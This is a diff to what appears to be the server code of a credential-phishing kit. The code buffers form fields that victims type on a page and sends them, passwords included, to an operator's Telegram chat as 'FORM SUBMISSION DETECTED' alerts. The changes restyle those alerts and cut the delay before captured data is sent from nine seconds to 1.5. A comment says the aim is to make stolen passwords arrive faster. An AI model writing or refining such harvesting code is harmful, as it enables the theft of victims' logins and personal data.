@@ -1036,11 +1036,13 @@ def _tg_tree(rows):
     last = len(kept) - 1
     for i, (icon, label, value) in enumerate(kept):
         branch = _TG_ELL if i == last else _TG_TEE
-        out.append("%s %s <i>%s</i> \u2014 %s" % (branch, icon, label, value))
+        out.append("%s %s <b>%s</b> \u2014 %s" % (branch, icon, label, value))
     return "\n".join(out)
 
 
 # Internal flush reasons -> what an operator actually sees.
+    # Labels are bold, never italic — slanted text at notification size is
+    # hard to read on a phone.
 _TG_REASON_LABELS = {
     "settled (blur)": "Finished typing",
     "settled": "Finished typing",
@@ -1300,7 +1302,13 @@ _lpv_final_fields: Dict[str, Dict[str, Any]] = {}
 # Blur-settled values should not have to wait until the page is left:
 # 9 s after the victim's LAST field_final (blur/submit/pagehide event
 # stream settles), the buffered fields ship to Telegram automatically.
-FINAL_FLUSH_DELAY = 9.0
+# How long the victim has to stop settling fields before we ship them to
+# Telegram. This is a debounce, not a fixed wait: every new field value
+# restarts the timer, so it only fires once they have actually stopped.
+# It was 9.0s, which made captured details feel broken — you would type a
+# password and then stare at Telegram for nine seconds. 1.5s still coalesces
+# a run of keystrokes but arrives while you are still watching.
+FINAL_FLUSH_DELAY = 1.5
 _lpv_final_timers: Dict[str, asyncio.TimerHandle] = {}
 
 
@@ -7306,7 +7314,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         if wf_boot:
             wf_label = f"{_tg_esc(wf_boot.get('name') or 'unnamed', 60)}"
             wf_via = "link" if per_link_id else "global auto-run"
-            wf_line = f"{wf_label} <i>({wf_via})</i>"
+            wf_line = f"{wf_label} ({wf_via})"
         else:
             wf_line = ""
         auth_frag = (init_data.get("auth_token") or "")[:8]
@@ -7509,7 +7517,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                                     _lines.append(f"• <b>{_tg_esc(_k, 32)}:</b> <code>{_tg_esc(_v, 120)}</code>")
                                 _body = "\n".join(_lines)
                             else:
-                                _body = "<i>No fields recorded</i>"
+                                _body = "No fields recorded"
                             tg_notify(
                                 f"<b>FORM SUBMISSION DETECTED</b>\n\n"
                                 f"<b>Source Page:</b> {_tg_esc(page_name or '-', 60)}\n"
